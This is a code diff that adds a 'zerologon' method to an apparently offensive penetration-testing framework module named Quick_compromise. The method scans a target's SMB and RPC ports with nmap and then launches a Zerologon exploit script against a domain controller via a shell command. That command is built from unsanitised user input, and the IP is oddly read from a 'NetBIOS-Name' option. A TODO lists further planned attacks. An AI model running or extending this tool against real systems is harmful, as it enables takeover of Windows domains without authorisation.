@@ -1,11 +1,14 @@
 import subprocess
 from core.module_base import ModuleBase
 from colorama import Fore, Style, init
+from utils.nmap import *
+
 
 
 
 init()
 
+##TODO: Veeam, nuclei templates/ zerologon
 
 class Quick_compromise(ModuleBase):
     def __init__(self):
@@ -48,4 +51,32 @@ class Quick_compromise(ModuleBase):
         except Exception as e:
             print(f"Error: {e}")
             return
+                
+    def zerologon(self):
+        ip = self.options["NetBIOS-Name"]
+        bios_name = input("Please provde a valid BIOS-Name: ")
+        ports = [445,135,139]
+
+        if not all([ip,bios_name]):
+            print("You must set ip and bios name")
+            return 
+        nmap_result = ports_scan(ip,ports)
+        print("Scanning for open ports...")
+        
+        if nmap_result and "open" in nmap_result:
+            print("\n [+] Ports detected as open, proceeding with Zerologon exploit...")
+            command = f"python3 utils/common_vuln/zerologon.py {bios_name} {ip}"
+            try:
+                print(f"Running Zerologon exploit on {ip}")
+                result = subprocess.run(command, shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+                if result.returncode == 0:
+                    print(f"{result.stdout}")
+                else:
+                    print(f"{result.stderr}")
+            except Exception as e:
+                print(f"Error: {e}")
             
+
+
+
+
